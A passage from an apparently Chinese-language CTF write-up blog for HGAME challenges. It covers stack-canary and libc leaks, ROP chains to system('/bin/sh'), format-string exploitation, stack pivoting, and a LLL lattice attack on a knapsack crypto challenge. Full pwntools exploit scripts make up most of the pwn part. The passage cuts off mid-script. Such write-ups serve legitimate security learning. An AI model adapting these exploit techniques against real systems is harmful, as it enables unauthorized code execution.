<span class="string">b&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;the flower number&quot;</span>, <span class="built_in">str</span>(<span class="number">94489280534</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;latter:&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析输出泄露Canary</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;the results.&quot;</span>)</span><br><span class="line">output = io.recvuntil(<span class="string">b&quot; = \n&quot;</span>).split(<span class="string">b&#x27; + &#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(output[-<span class="number">7</span>])  </span><br><span class="line">ret_addr = <span class="built_in">int</span>(output[-<span class="number">5</span>])  </span><br><span class="line">main_pie_addr = <span class="built_in">int</span>(output[-<span class="number">3</span>])  </span><br><span class="line"></span><br><span class="line">libc_base = ret_addr - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">128</span> + <span class="number">176</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&quot;Canary: <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;ret_addr: <span class="subst">&#123;<span class="built_in">hex</span>(ret_addr)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;main_pie_addr: <span class="subst">&#123;<span class="built_in">hex</span>(main_pie_addr)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;libc_base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rdi = libc_base + libc.search(asm(<span class="string">&quot;pop rdi\nret&quot;</span>)).__next__()</span><br><span class="line">ret = libc_base + <span class="number">0x29139</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot; time?&quot;</span>, <span class="string">b&quot;16&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;the flower number&quot;</span>, <span class="string">b&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;the flower number&quot;</span>, <span class="string">b&#x27;24&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;the flower number&quot;</span>, <span class="string">b&quot;+&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(data - (<span class="number">1</span> &lt;&lt; <span class="number">48</span>)) <span class="keyword">if</span> data &gt; <span class="number">0x7FFFFFFFFFFF</span> <span class="keyword">else</span> <span class="built_in">str</span>(data)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;the flower number&quot;</span>, check(ret))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;the flower number&quot;</span>, check(pop_rdi))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;the flower number&quot;</span>, check(binsh))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;the flower number&quot;</span>, check(system))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;the flower number&quot;</span>, <span class="string">b&quot;+&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;latter:&quot;</span>, <span class="string">b&quot;+&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>check防止溢出，<code>check_value</code> 函数的作用是 <strong>绕过符号扩展问题</strong>，确保输入的地址值被漏洞程序正确解析为无符号的 64 位地址。+号是专门针对scanf，来跳过的。moectf好像有个差不多的学到的</p>
</blockquote>
<p>libc_base &#x3D; ret_addr - libc.sym[‘__libc_start_main’] - 128 + 176怎么来的?</p>
<p>调试无意间发现，差176</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250207223014630.png" alt="image-20250207223014630"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250207223652766.png" alt="image-20250207223652766"></p>
<h3 id="ezstack"><a href="#ezstack" class="headerlink" title="ezstack"></a>ezstack</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250208103019456.png" alt="image-20250208103019456"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span>&#123;</span><br><span class="line">  <span class="type">socklen_t</span> addr_len; <span class="comment">// [rsp+Ch] [rbp-44h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr</span>;</span> <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> optval; <span class="comment">// [rsp+2Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">s</span>;</span> <span class="comment">// [rsp+30h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">__pid_t</span> v7; <span class="comment">// [rsp+44h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+4Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  signal(<span class="number">17</span>, (<span class="type">__sighandler_t</span>)<span class="number">1</span>);</span><br><span class="line">  fd = socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )&#123;</span><br><span class="line">    perror(<span class="string">&quot;socket error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  s.sa_family = <span class="number">2</span>;</span><br><span class="line">  *(_WORD *)s.sa_data = htons(<span class="number">0x270Fu</span>);</span><br><span class="line">  *(_DWORD *)&amp;s.sa_data[<span class="number">2</span>] = htonl(<span class="number">0</span>);</span><br><span class="line">  optval = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( setsockopt(fd, <span class="number">1</span>, <span class="number">2</span>, &amp;optval, <span class="number">4u</span>) &lt; <span class="number">0</span> )&#123;</span><br><span class="line">    perror(<span class="string">&quot;setsockopt error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( bind(fd, &amp;s, <span class="number">0x10u</span>) &lt; <span class="number">0</span> )&#123;</span><br><span class="line">    perror(<span class="string">&quot;bind error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( listen(fd, <span class="number">10</span>) &lt; <span class="number">0</span> )&#123;</span><br><span class="line">    perror(<span class="string">&quot;listen error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  addr_len = <span class="number">16</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )&#123;</span><br><span class="line">    v8 = accept(fd, &amp;addr, &amp;addr_len);</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v7 = fork();</span><br><span class="line">    <span class="keyword">if</span> ( v7 == <span class="number">-1</span> )&#123;</span><br><span class="line">      perror(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !v7 )&#123;</span><br><span class="line">      handler(v8);</span><br><span class="line">      close(v8);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(v8);</span><br><span class="line">  &#125;</span><br><span class="line">  perror(<span class="string">&quot;accept error&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250208210546534.png" alt="image-20250208210546534"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250208210557090.png" alt="image-20250208210557090"></p>
<p>可溢出</p>
<blockquote>
<p>其实这题就是栈迁移+orw，但是对于新手来说这题不一样的就是通信方式和给了个Dockerfile，容易让人迷惑</p>
</blockquote>
<p>我们执行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker build -t pwn_vuln .</span><br><span class="line">docker run -p 9999:9999 -p 1234:1234 --name my_pwn_container -d my_pwn</span><br><span class="line">docker exec -it my_pwn</span><br></pre></td></tr></table></figure>

<p>即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250221203454374.png" alt="image-20250221203454374"></p>
<p>libc版本：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250221204305235.png" alt="image-20250221204305235"></p>
<blockquote>
<p>这题麻烦在调试上，不太会这样的调试，参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wanghao-boke/p/17055307.html">Linux 多进程程序调试实例(一) –GDB调试fork函数 - 王清河 - 博客园</a></p>
</blockquote>
<h3 id="format"><a href="#format" class="headerlink" title="format"></a>format</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">4</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you have n chance to getshell\n n = &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v6) &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;type something:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%3s&quot;</span>, format) &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;you type: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you have n space to getshell(n&lt;5)\n n = &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d\n&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)v5 &lt;= <span class="number">5</span> )</span><br><span class="line">    vuln(v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意这里是int v5而上面是uint类型。</p>
<p>只能输入三个字符，那我们直接%p泄露个栈地址</p>
<p>打印出0x7fffffffb430</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250210180901815.png" alt="image-20250210180901815"></p>
<p>如果后面要泄露什么操作的话，可以通过这个地址进行计算</p>
<p>进入到vuln函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250210180752169.png" alt="image-20250210180752169"></p>
<p>d540-b430&#x3D;8464</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250210230357443.png" alt="image-20250210230357443"></p>
<p>vuln中没有相应gadgets,但是libc.so中有，要利用需要libc_base，所以得到rbp后我们不能直接去泄露，因为不知道libc_base，想想其他方法。而且我们没有%p来泄露</p>
<p>我们可以通过_libc_start_main来泄露libc_base，注意还有128这些跟counting petals差不多，128+29DC0 &#x3D; 29E40</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250211114527381.png" alt="image-20250211114527381"></p>
<p>迁移前的栈：原Rbp是0x7ffca7f4c850</p>
<p>迁移完的栈：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250211130726600.png" alt="image-20250211130726600"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">LOCAL = <span class="literal">True</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    io = process(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node1.hgame.vidar.club&quot;</span>, <span class="number">31045</span>)</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x401333</span></span><br><span class="line">printf = <span class="number">0x4012CF</span></span><br><span class="line">read = <span class="number">0x4011D9</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;n = &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>) </span><br><span class="line">io.sendlineafter(<span class="string">&#x27;type something:&#x27;</span>, <span class="string">&#x27;%p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;you type: &quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stack_addr---&gt;&gt;&gt;&quot;</span>,<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;n = &#x27;</span>, <span class="string">b&#x27;-55555555&#x27;</span>)</span><br><span class="line">rbp = stack_addr + <span class="number">8464</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rbp_addr---&gt;&gt;&gt;&quot;</span>,<span class="built_in">hex</span>(rbp))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">5</span> + p64(rbp + <span class="number">0x60</span>) + p64(read)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">4</span> + p64(rbp + <span class="number">0x90</span>) + p64(printf) + p64(<span class="number">0</span>) * <span class="number">2</span> + <span class="string">b&quot;%17$p\xbc\x23\x84&quot;</span> + p64(<span class="number">0</span>) + p64(rbp) + p64(<span class="number">0x4011F0</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;type something:&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recv(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">0x29E40</span></span><br><span class="line">rdi_addr = libc_base + libc.search(asm(<span class="string">&quot;pop rdi\nret&quot;</span>)).__next__()</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload =  <span class="string">b&quot;a&quot;</span> * <span class="number">4</span> + p64(ret_addr) + p64(<span class="number">0x4011EF</span>) + p64(rdi_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>调试发现还需要栈平衡</p>
</blockquote>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="ezBag"><a href="#ezBag" class="headerlink" title="ezBag"></a>ezBag</h3><p>DeepSeek速通</p>
<p>在线 SAGE 计算：<a target="_blank" rel="noopener" href="https://czhang271828.github.io/z/SageMathCell.html">SageMathCell</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># SageMath代码</span><br><span class="line">list=[[2826962231, 3385780583, 3492076631, 3387360133, 2955228863, 2289302839, 2243420737, 4129435549, 4249730059, 3553886213, 3506411549, 3658342997, 3701237861, 4279828309, 2791229339, 4234587439, 3870221273, 2989000187, 2638446521, 3589355327, 3480013811, 3581260537, 2347978027, 3160283047, 2416622491, 2349924443, 3505689469, 2641360481, 3832581799, 2977968451, 4014818999, 3989322037, 4129732829, 2339590901, 2342044303, 3001936603, 2280479471, 3957883273, 3883572877, 3337404269, 2665725899, 3705443933, 2588458577, 4003429009, 2251498177, 2781146657, 2654566039, 2426941147, 2266273523, 3210546259, 4225393481, 2304357101, 2707182253, 2552285221, 2337482071, 3096745679, 2391352387, 2437693507, 3004289807, 3857153537, 3278380013, 3953239151, 3486836107, 4053147071], [2241199309, 3658417261, 3032816659, 3069112363, 4279647403, 3244237531, 2683855087, 2980525657, 3519354793, 3290544091, 2939387147, 3669562427, 2985644621, 2961261073, 2403815549, 3737348917, 2672190887, 2363609431, 3342906361, 3298900981, 3874372373, 4287595129, 2154181787, 3475235893, 2223142793, 2871366073, 3443274743, 3162062369, 2260958543, 3814269959, 2429223151, 3363270901, 2623150861, 2424081661, 2533866931, 4087230569, 2937330469, 3846105271, 3805499729, 4188683131, 2804029297, 2707569353, 4099160981, 3491097719, 3917272979, 2888646377, 3277908071, 2892072971, 2817846821, 2453222423, 3023690689, 3533440091, 3737441353, 3941979749, 2903000761, 3845768239, 2986446259, 3630291517, 3494430073, 2199813137, 2199875113, 3794307871, 2249222681, 2797072793], [4263404657, 3176466407, 3364259291, 4201329877, 3092993861, 2771210963, 3662055773, 3124386037, 2719229677, 3049601453, 2441740487, 3404893109, 3327463897, 3742132553, 2833749769, 2661740833, 3676735241, 2612560213, 3863890813, 3792138377, 3317100499, 2967600989, 2256580343, 2471417173, 2855972923, 2335151887, 3942865523, 2521523309, 3183574087, 2956241693, 2969535607, 2867142053, 2792698229, 3058509043, 3359416111, 3375802039, 2859136043, 3453019013, 3817650721, 2357302273, 3522135839, 2997389687, 3344465713, 2223415097, 2327459153, 3383532121, 3960285331, 3287780827, 4227379109, 3679756219, 2501304959, 4184540251, 3918238627, 3253307467, 3543627671, 3975361669, 3910013423, 3283337633, 2796578957, 2724872291, 2876476727, 4095420767, 3011805113, 2620098961], [2844773681, 3852689429, 4187117513, 3608448149, 2782221329, 4100198897, 3705084667, 2753126641, 3477472717, 3202664393, 3422548799, 3078632299, 3685474021, 3707208223, 2626532549, 3444664807, 4207188437, 3422586733, 2573008943, 2992551343, 3465105079, 4260210347, 3108329821, 3488033819, 4092543859, 4184505881, 3742701763, 3957436129, 4275123371, 3307261673, 2871806527, 3307283633, 2813167853, 2319911773, 3454612333, 4199830417, 3309047869, 2506520867, 3260706133, 2969837513, 4056392609, 3819612583, 3520501211, 2949984967, 4234928149, 2690359687, 3052841873, 4196264491, 3493099081, 3774594497, 4283835373, 2753384371, 2215041107, 4054564757, 4074850229, 2936529709, 2399732833, 3078232933, 2922467927, 3832061581, 3871240591, 3526620683, 2304071411, 3679560821]]</span><br><span class="line">bag=[123342809734, 118191282440, 119799979406, 128273451872]</span><br><span class="line"></span><br><span class="line"># 构造四个方程的行</span><br><span class="line">rows = []</span><br><span class="line">for i in range(4):</span><br><span class="line">    a = list[i]</span><br><span class="line">    b = bag[i]</span><br><span class="line">    row = a + [-b]</span><br><span class="line">    rows.append(row)</span><br><span class="line"></span><br><span class="line">A = Matrix(ZZ, rows)</span><br><span class="line">K = A.right_kernel()</span><br><span class="line">B = K.basis_matrix()</span><br><span class="line"></span><br><span class="line"># 应用LLL算法</span><br><span class="line">L = B.LLL()</span><br><span class="line"></span><br><span class="line">found = False</span><br><span class="line">p = 0</span><br><span class="line">for row in L:</span><br><span class="line">    if row[-1] not in [1, -1]:</span><br><span class="line">        continue</span><br><span class="line">    x = (row / row[-1]).list()[:-1]  # 归一化并取出前64位</span><br><span class="line">    valid = all(bit in (0, 1) for bit in x)</span><br><span class="line">    if valid:</span><br><span class="line">        p = sum(bit * (1 &lt;&lt; i) for i, bit in enumerate(x))</span><br><span class="line">        print(f&quot;Found p: &#123;p&#125;&quot;)</span><br><span class="line">        found = True</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">if not found:</span><br><span class="line">    print(&quot;No solution found.&quot;)</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250210142122022.png" alt="image-20250210142122022"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">17739748707559623655</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复的p值</span></span><br><span class="line">p = <span class="number">17739748707559623655</span>  <span class="comment"># 替换为实际找到的p</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成密钥</span></span><br><span class="line">key = hashlib.sha256(<span class="built_in">str</span>(p).encode()).digest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">ciphertext = <span 